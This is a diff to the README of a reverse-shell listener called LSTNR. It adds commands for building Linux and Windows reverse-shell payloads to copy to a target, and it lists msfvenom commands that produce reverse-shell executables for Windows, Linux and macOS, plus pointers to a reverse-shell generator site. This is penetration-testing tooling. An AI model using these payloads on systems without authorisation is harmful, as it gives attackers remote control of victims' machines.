@@ -23,8 +23,11 @@ cd lstnr
 1. Start LSTNR
     - `python3 lstnr.py -p <PORT_TO_LISTEN>`
 - MENU COMMANDS
+    - `help` or `?` : Displays info and usage on all commands
     - `ls` : lists connected clients
     - `cs <ID>` : connects to that session
+    - `payload linux -lhost <IP> -lport <PORT` : Builds a rev.sh locally to copy to TGT
+    - `payload windows -lhost <IP> -lport <PORT` : Builds a rev.ps1 locally to copy to TGT
     - `die` : Will terminate all sessions
     - `exit` : will terminate all sessions and stop the script
 - SESSION COMMANDS
@@ -36,14 +39,15 @@ cd lstnr
     - `CTRL+C` or `bs` : backgrounds the active session
     - `die` : while in a session will terminate it
 
-
 2. Have CLIENT connect to LSTNR
-    - Best options that work with `lstnr.py`
-        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f exe -o rev.exe`
-        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f dll -o rev.dll`
-        - Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f elf -o rev.elf`
-        - MacOS: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f macho -o rev.macho`
-    - You can use any of the methods found on https://www.revshells.com
+    - LSTNR has built in revshells, but depending on your situation, please see the following.
+    - MSFVENOM
+        - Best options that work with `lstnr.py`
+            - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f exe -o rev.exe`
+            - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f dll -o rev.dll`
+            - Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f elf -o rev.elf`
+            - MacOS: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f macho -o rev.macho`
+    - https://www.revshells.com (recommended)
         - Windows: `Powershell #3 (Base64)`
         - Linux: `Bash -i`
         - MacOS: `python3`
